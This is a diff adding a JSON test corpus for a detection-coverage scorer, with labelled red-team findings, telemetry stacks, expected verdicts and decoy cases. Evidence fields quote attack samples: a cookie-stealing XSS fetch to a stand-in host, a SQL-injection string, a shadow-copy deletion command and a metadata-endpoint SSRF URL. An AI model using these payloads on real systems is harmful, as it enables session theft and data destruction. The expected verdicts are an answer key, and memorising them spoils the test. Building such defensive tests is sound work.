@@ -1,0 +1,325 @@
+{
+  "note": "Detection-coverage corpus for the Blue loadout. Each case pairs a labeled findings ledger with a declared telemetry stack and a KNOWN ground-truth coverage verdict per finding (covered / partial / none) plus the exact uncovered countermeasure ids. Decoy findings carry WRONG countermeasure keys — invented ids, or real ids from the wrong countermeasure family — that must NOT score as covered, and invented ids must surface as unresolved (never silently used). All countermeasure ids are D3FEND ids from the vendored ontology; all telemetry source slugs are real TELEMETRY_REGISTRY entries. Scores the REAL pipeline (dist/teams/blue/coverage.js), so expectations track the shipped scorer, not a vendored copy.",
+  "decoy_penalty": 5,
+  "cases": [
+    {
+      "id": "case-lateral-movement-endpoint",
+      "desc": "Post-expansion endpoint + identity case: process telemetry and SIEM correlation deployed, network and Kerberos-attack countermeasures not",
+      "domains": ["endpoint", "identity"],
+      "findings": [
+        {
+          "id": "RT-BEACON-C2-IMPLANT",
+          "title": "Cobalt Strike beacon spawn chain from Office child process",
+          "severity": "critical",
+          "evidence": ["winword.exe -> rundll32.exe -> beacon.x64.dll lineage on FIN-4102"],
+          "countermeasures": ["D3-PSA", "D3-PLA"]
+        },
+        {
+          "id": "RT-PASS-THE-HASH",
+          "title": "NTLM pass-the-hash against SERVER-02 ADMIN$ share",
+          "severity": "critical",
+          "evidence": ["logon type 3 with NT hash, no corresponding interactive session"],
+          "countermeasures": ["D3-UGLPA", "D3-RAPA"]
+        },
+        {
+          "id": "RT-DNS-TUNNELING",
+          "title": "DNS tunneling exfil over TXT queries to c2.example-zone.com",
+          "severity": "high",
+          "evidence": ["240 TXT queries/min, 189-byte subdomain labels from FIN-4102"],
+          "countermeasures": ["D3-DNSTA", "D3-DNRA"]
+        }
+      ],
+      "telemetry": [
+        { "source": "edr-process-telemetry", "countermeasures": ["D3-PSA", "D3-PLA"] },
+        { "source": "siem-correlation", "countermeasures": ["D3-UGLPA", "D3-SDA", "D3-CCSA"] }
+      ],
+      "expect": {
+        "RT-BEACON-C2-IMPLANT": { "coverage": "covered", "uncovered": [] },
+        "RT-PASS-THE-HASH": { "coverage": "partial", "uncovered": ["D3-RAPA"] },
+        "RT-DNS-TUNNELING": { "coverage": "partial", "uncovered": ["D3-DNSTA", "D3-DNRA"] }
+      }
+    },
+    {
+      "id": "case-identity-attack-spray",
+      "desc": "Identity-plane case: IdP logging plus SIEM correlation deployed; MFA-fatigue and password-spray countermeasures only partly keyed",
+      "domains": ["identity"],
+      "findings": [
+        {
+          "id": "RT-MFA-FATIGUE-PUSH",
+          "title": "MFA push-bombing against executive account",
+          "severity": "high",
+          "evidence": ["14 push prompts in 6 minutes outside business hours"],
+          "countermeasures": ["D3-MFA", "D3-ANET"]
+        },
+        {
+          "id": "RT-OAUTH-CONSENT-PHISH",
+          "title": "Illicit OAuth consent grant to third-party mail-read app",
+          "severity": "high",
+          "evidence": ["consent to Mail.ReadWrite for app ext-7f3a from CEO account"],
+          "countermeasures": ["D3-AZET", "D3-CCSA"]
+        },
+        {
+          "id": "RT-PASSWORD-SPRAY",
+          "title": "Password spray across VPN endpoint from residential proxy pool",
+          "severity": "high",
+          "evidence": ["1 lockout per account, 410 accounts touched, 9 source ASNs"],
+          "countermeasures": ["D3-UGLPA"]
+        }
+      ],
+      "telemetry": [
+        { "source": "identity-provider-logging", "countermeasures": ["D3-ANET", "D3-AZET", "D3-CCSA"] },
+        { "source": "siem-correlation", "countermeasures": ["D3-ANET", "D3-AZET", "D3-RAPA", "D3-JFAPA"] }
+      ],
+      "expect": {
+        "RT-MFA-FATIGUE-PUSH": { "coverage": "partial", "uncovered": ["D3-MFA"] },
+        "RT-OAUTH-CONSENT-PHISH": { "coverage": "covered", "uncovered": [] },
+        "RT-PASSWORD-SPRAY": { "coverage": "partial", "uncovered": ["D3-UGLPA"] }
+      }
+    },
+    {
+      "id": "case-web-exploitation",
+      "desc": "Internet-facing case: WAF and web access logging deployed; server-side request countermeasure family unkeyed",
+      "domains": ["web", "network"],
+      "findings": [
+        {
+          "id": "RT-SQLI-UNION-INJECT",
+          "title": "UNION-based SQL injection in catalog search parameter",
+          "severity": "critical",
+          "evidence": ["' UNION SELECT NULL,version(),NULL-- in query log"],
+          "countermeasures": ["D3-DQSA", "D3-CSPP"]
+        },
+        {
+          "id": "RT-XSS-STORED",
+          "title": "Stored XSS in user-profile bio field harvesting sessions",
+          "severity": "high",
+          "evidence": ["<script>fetch('//exfil.onl/'+document.cookie) stored via profile edit"],
+          "countermeasures": ["D3-CSPP"]
+        },
+        {
+          "id": "RT-SSRF-INTERNAL-METADATA",
+          "title": "SSRF against cloud metadata endpoint from web tier",
+          "severity": "critical",
+          "evidence": ["image-preview URL fetching 169.254.169.254/latest/meta-data"],
+          "countermeasures": ["D3-NTA", "D3-PMAD"]
+        }
+      ],
+      "telemetry": [
+        { "source": "waf-detection", "countermeasures": ["D3-DQSA", "D3-CSPP"] },
+        { "source": "web-access-logging", "countermeasures": ["D3-APCA", "D3-CSPP", "D3-UA", "D3-WSAA"] }
+      ],
+      "expect": {
+        "RT-SQLI-UNION-INJECT": { "coverage": "covered", "uncovered": [] },
+        "RT-XSS-STORED": { "coverage": "covered", "uncovered": [] },
+        "RT-SSRF-INTERNAL-METADATA": { "coverage": "partial", "uncovered": ["D3-NTA", "D3-PMAD"] }
+      }
+    },
+    {
+      "id": "case-greenfield-no-telemetry",
+      "desc": "Greenfield case: zero telemetry declared — everything must score none, including a finding with no countermeasure keys at all",
+      "domains": ["endpoint"],
+      "findings": [
+        {
+          "id": "RT-RANSOMWARE-STAGING",
+          "title": "Ransomware staging: shadow-copy deletion plus mass file rename",
+          "severity": "critical",
+          "evidence": ["vssadmin delete shadows /all followed by 41k file extensions changed in 4 min"],
+          "countermeasures": ["D3-FIM", "D3-SEA"]
+        },
+        {
+          "id": "RT-UNQUOTED-SERVICE-PATH",
+          "title": "Unquoted Windows service path permits privilege escalation",
+          "severity": "medium",
+          "evidence": ["svc binary at C:\\Program Files\\Vendor Agent\\agent.exe, writable parent"]
+        }
+      ],
+      "telemetry": [],
+      "expect": {
+        "RT-RANSOMWARE-STAGING": { "coverage": "none", "uncovered": ["D3-FIM", "D3-SEA"] },
+        "RT-UNQUOTED-SERVICE-PATH": { "coverage": "none", "uncovered": [] }
+      }
+    },
+    {
+      "id": "case-deception-grid",
+      "desc": "Deception case: canary credential touched on the deception grid scores covered; adjacent Kerberoasting stays uncovered",
+      "domains": ["deception"],
+      "findings": [
+        {
+          "id": "RT-CANARY-CRED-USE",
+          "title": "Canary credential authentication attempt on unreachable file share",
+          "severity": "critical",
+          "evidence": ["decoy account svc-backup-auth used against honeypot share \\\\canary-fs-03"],
+          "countermeasures": ["D3-DUC"]
+        },
+        {
+          "id": "RT-KERBEROASTING-RC4",
+          "title": "Kerberoasting against RC4-encrypted service accounts",
+          "severity": "high",
+          "evidence": ["47 TGS-REQ for RC4 SPNs in 90 seconds from one host"],
+          "countermeasures": ["D3-UGLPA", "D3-SDA"]
+        }
+      ],
+      "telemetry": [
+        { "source": "deception-grid", "countermeasures": ["D3-DUC", "D3-IHN"] }
+      ],
+      "expect": {
+        "RT-CANARY-CRED-USE": { "coverage": "covered", "uncovered": [] },
+        "RT-KERBEROASTING-RC4": { "coverage": "partial", "uncovered": ["D3-UGLPA", "D3-SDA"] }
+      }
+    },
+    {
+      "id": "case-legacy-direct-finding-coverage",
+      "desc": "v1-semantics case: legacy content pack lists finding ids directly (coveredIds, no countermeasure keys) — direct finding-id coverage must hold",
+      "domains": ["endpoint", "identity"],
+      "findings": [
+        {
+          "id": "RT-CRON-JOB-PERSISTENCE",
+          "title": "Suspicious cron job persistence under /etc/cron.d",
+          "severity": "high",
+          "evidence": ["new /etc/cron.d/sync-health entry calling curl every 15 min"],
+          "countermeasures": ["D3-SJA", "D3-SDM"]
+        },
+        {
+          "id": "RT-LEGACY-AGENT-CHECK",
+          "title": "Legacy agent version disclosure on management console",
+          "severity": "low",
+          "evidence": ["X-Agent-Version: 2.3.1 response header on /admin"]
+        }
+      ],
+      "telemetry": [
+        { "source": "siem-correlation", "coveredIds": ["RT-CRON-JOB-PERSISTENCE", "RT-LEGACY-AGENT-CHECK"] }
+      ],
+      "expect": {
+        "RT-CRON-JOB-PERSISTENCE": { "coverage": "covered", "uncovered": [] },
+        "RT-LEGACY-AGENT-CHECK": { "coverage": "covered", "uncovered": [] }
+      }
+    },
+    {
+      "id": "case-full-stack-detection",
+      "desc": "Mature-stack case: file, FIM, DNS, and flow telemetry all deployed — most findings covered, one flow countermeasure unkeyed, one finding carries an unresolvable id that must still surface",
+      "domains": ["endpoint", "network"],
+      "findings": [
+        {
+          "id": "RT-WEB-SHELL-DROP",
+          "title": "Web shell dropped into site document root",
+          "severity": "critical",
+          "evidence": ["new aspx file with request/cmd pattern under inetpub written by w3wp"],
+          "countermeasures": ["D3-FA", "D3-FH", "D3-FIM"]
+        },
+        {
+          "id": "RT-DGA-BEACON-LOOKUPS",
+          "title": "DGA algorithmic DNS lookups from finance workstation",
+          "severity": "high",
+          "evidence": ["312 NXDOMAIN lookups to random .xyz domains in 10 min"],
+          "countermeasures": ["D3-DNSTA", "D3-DNRA", "D3-HD"]
+        },
+        {
+          "id": "RT-FIREWALL-CONFIG-DRIFT",
+          "title": "Edge firewall rule widened to any-any egress",
+          "severity": "high",
+          "evidence": ["rule 42 changed from 443 to any/any outside change window"],
+          "countermeasures": ["D3-SDM", "D3-NTF"]
+        },
+        {
+          "id": "RT-BYOV-DRIFT-UNKNOWN-CM",
+          "title": "Boot-volume tamper attempt on golden image",
+          "severity": "high",
+          "evidence": ["bcdedit status flag flip on IMG-GOLD-01 outside build pipeline"],
+          "countermeasures": ["D3-SBV", "D3-NONEXISTENT-9"]
+        }
+      ],
+      "telemetry": [
+        { "source": "edr-file-telemetry", "countermeasures": ["D3-FA", "D3-FH", "D3-FIM", "D3-FCOA"] },
+        { "source": "file-integrity-monitoring", "countermeasures": ["D3-FIM", "D3-SFA", "D3-SICA", "D3-USICA", "D3-SJA", "D3-SDM", "D3-SBV"] },
+        { "source": "dns-query-logging", "countermeasures": ["D3-DNSTA", "D3-DNRA", "D3-HD"] },
+        { "source": "network-flow-analysis", "countermeasures": ["D3-NTA", "D3-NTSA", "D3-PMAD", "D3-CAA", "D3-ISVA", "D3-RPA", "D3-ANAA"] }
+      ],
+      "expect": {
+        "RT-WEB-SHELL-DROP": { "coverage": "covered", "uncovered": [] },
+        "RT-DGA-BEACON-LOOKUPS": { "coverage": "covered", "uncovered": [] },
+        "RT-FIREWALL-CONFIG-DRIFT": { "coverage": "partial", "uncovered": ["D3-NTF"] },
+        "RT-BYOV-DRIFT-UNKNOWN-CM": { "coverage": "covered", "uncovered": [], "unresolved": ["D3-NONEXISTENT-9"] }
+      }
+    },
+    {
+      "id": "case-email-phishing",
+      "desc": "Email + intel case: gateway verdicts and threat-intel enrichment deployed; business-email-compromise countermeasure half-keyed",
+      "domains": ["email"],
+      "findings": [
+        {
+          "id": "RT-SPEARPHISH-ATTACHMENT",
+          "title": "Spearphish with macro-lured DOCX to finance team",
+          "severity": "high",
+          "evidence": ["invoice_2026.docx with remote template, 6 recipients, 1 execution"],
+          "countermeasures": ["D3-SRA", "D3-MA"]
+        },
+        {
+          "id": "RT-PHISHING-KIT-INFRA",
+          "title": "Phishing kit infrastructure reuse across campaigns",
+          "severity": "medium",
+          "evidence": ["landing page template hash matches known kit, 3 fresh domains"],
+          "countermeasures": ["D3-IPRA", "D3-DNRA"]
+        },
+        {
+          "id": "RT-BEC-INVOICE-FRAUD",
+          "title": "BEC invoice-redirection reply thread on vendor mailbox",
+          "severity": "critical",
+          "evidence": ["reply-chain threadjack switching IBAN, no malware artifact"],
+          "countermeasures": ["D3-SMRA", "D3-CCSA"]
+        }
+      ],
+      "telemetry": [
+        { "source": "email-gateway-logging", "countermeasures": ["D3-SRA", "D3-SMRA", "D3-MA"] },
+        { "source": "threat-intel-enrichment", "countermeasures": ["D3-IRA", "D3-IPRA", "D3-FHRA", "D3-DNRA", "D3-IAA", "D3-UA"] }
+      ],
+      "expect": {
+        "RT-SPEARPHISH-ATTACHMENT": { "coverage": "covered", "uncovered": [] },
+        "RT-PHISHING-KIT-INFRA": { "coverage": "covered", "uncovered": [] },
+        "RT-BEC-INVOICE-FRAUD": { "coverage": "partial", "uncovered": ["D3-CCSA"] }
+      }
+    },
+    {
+      "id": "decoy-invented-ids",
+      "decoy": true,
+      "desc": "Decoy: finding hallucinates countermeasure ids that do not exist in the ontology — must NOT score covered, ids must surface as unresolved",
+      "domains": ["decoy"],
+      "findings": [
+        {
+          "id": "DECOY-HALLUCINATED-COUNTERMEASURES",
+          "title": "Decoy finding citing invented D3FEND ids",
+          "severity": "critical",
+          "evidence": ["countermeasures D3-FAKE-CM and D3-NOT-REAL do not exist in D3FEND_BY_ID"],
+          "countermeasures": ["D3-FAKE-CM", "D3-NOT-REAL"]
+        }
+      ],
+      "telemetry": [
+        { "source": "edr-process-telemetry", "countermeasures": ["D3-PSA", "D3-PLA", "D3-SCA", "D3-SEA"] },
+        { "source": "siem-correlation", "countermeasures": ["D3-ANET", "D3-AZET"] }
+      ],
+      "expect": {
+        "DECOY-HALLUCINATED-COUNTERMEASURES": { "coverage": "partial", "uncovered": [], "unresolved": ["D3-FAKE-CM", "D3-NOT-REAL"] }
+      }
+    },
+    {
+      "id": "decoy-wrong-family-keys",
+      "decoy": true,
+      "desc": "Decoy: finding keys REAL ids from the wrong countermeasure family (encryption countermeasures for an identity-theft finding) — resolves but must NOT score covered",
+      "domains": ["decoy", "identity"],
+      "findings": [
+        {
+          "id": "DECOY-WRONG-FAMILY-KEYS",
+          "title": "Decoy finding tagged with encryption countermeasures for credential theft",
+          "severity": "high",
+          "evidence": ["D3-MENCR and D3-DENCR are real ontology ids but detect nothing here"],
+          "countermeasures": ["D3-MENCR", "D3-DENCR"]
+        }
+      ],
+      "telemetry": [
+        { "source": "identity-provider-logging", "countermeasures": ["D3-ANET", "D3-AZET", "D3-CCSA", "D3-SDA"] },
+        { "source": "siem-correlation", "countermeasures": ["D3-ANET", "D3-AZET", "D3-RAPA", "D3-JFAPA", "D3-UGLPA"] }
+      ],
+      "expect": {
+        "DECOY-WRONG-FAMILY-KEYS": { "coverage": "partial", "uncovered": ["D3-MENCR", "D3-DENCR"], "unresolved": [] }
+      }
+    }
+  ]
+}
